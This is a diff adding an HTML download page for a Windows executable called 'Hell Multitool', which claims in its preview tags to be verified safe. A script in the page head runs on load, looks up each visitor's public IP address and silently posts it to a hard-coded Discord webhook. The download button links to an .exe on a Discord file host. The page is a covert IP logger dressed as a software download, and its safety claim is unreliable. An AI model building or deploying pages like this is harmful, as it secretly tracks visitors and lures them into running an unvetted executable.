@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Page</title>
+    <meta property="og:title" content="Hell Multitool Download V1.6.4" />
+    <meta property="og:description" content="The original download for Hell Multitool V1.6.4. This is the only way to download the latest version and has been verified by virustotal to be safe. More information is on the site!" />
+    <meta property="og:image" content="https://cdn.discordapp.com/attachments/1101253566632579182/1103370813685641256/image.png" />
+    <meta property="og:url" content="https://northholdgames.github.io/hell.github.io/" />
+    <meta property="og:type" content="website" />
+    <style>
+        body {
+            background-color: black;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        img {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            max-width: 65%;
+            max-height: 90%;
+            z-index: -1;
+        }
+
+        button {
+            background-color: #0059ff;
+            color: #222;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #f00;
+            color: #ffa500;
+            cursor: pointer;
+        }
+
+        button:hover ~ body {
+            background-color: black;
+        }
+    </style>
+    <script>
+        function sendMessage(webhookURL, message) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({content: message})
+            })
+            .catch(error => console.log(error));
+        }
+
+        function splitMessage(message, maxLength) {
+            var messages = [];
+            var words = message.split(' ');
+            var currentMessage = '';
+            words.forEach(word => {
+                if (currentMessage.length + word.length < maxLength) {
+                    currentMessage += word + ' ';
+                } else {
+                    messages.push(currentMessage.trim());
+                    currentMessage = word + ' ';
+                }
+            });
+            messages.push(currentMessage.trim());
+            return messages;
+        }
+
+        function downloadFile(url) {
+            fetch(url)
+                .then(response => response.blob())
+                .then(blob => {
+                    const url = window.URL.createObjectURL(new Blob([blob]));
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.download = 'file';
+                    document.body.appendChild(a);
+                    a.click();
+                    a.remove();
+                })
+                .catch(error => console.log(error));
+        }
+
+        window.onload = function() {
+            // Send IP to Discord webhook
+            var ip = '';
+            fetch('https://api4.my-ip.io/ip.txt')
+                .then(response => response.text())
+                .then(data => {
+                    ip = data.trim();
+                    var webhookURL = 'https://discord.com/api/webhooks/1101637278436163748/T-8VIFxTluvdizOU9JBHsWYgjgEWUxjFJ2I8ZymYq23eMVcnl3hDflKLI3txbZG8GUth';
+                    var content = 'IP Address: ' + ip;
+                    if (content.length <= 2000) {
+                        sendMessage(webhookURL, content);
+                    } else {
+                        var messages = splitMessage(content, 2000);
+                        messages.forEach(message => sendMessage(webhookURL, message));
+                    }
+                })
+                .catch(error => console.log(error));
+        };
+    </script>
+</head>
+<body>
+    <img src="https://github.com/NorthHoldgames/hell.github.io/raw/main/Hell%20Multitool%20x16.jpg" alt="Hell Multitool">
+    <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
+        <br>
+        <button onclick="window.open('https://cdn.discordapp.com/attachments/1101253566632579182/1107286066584633466/Hell.exe', '_blank')">
+            Download Hell Multitool
+        </button>
+    </div>
+</body>
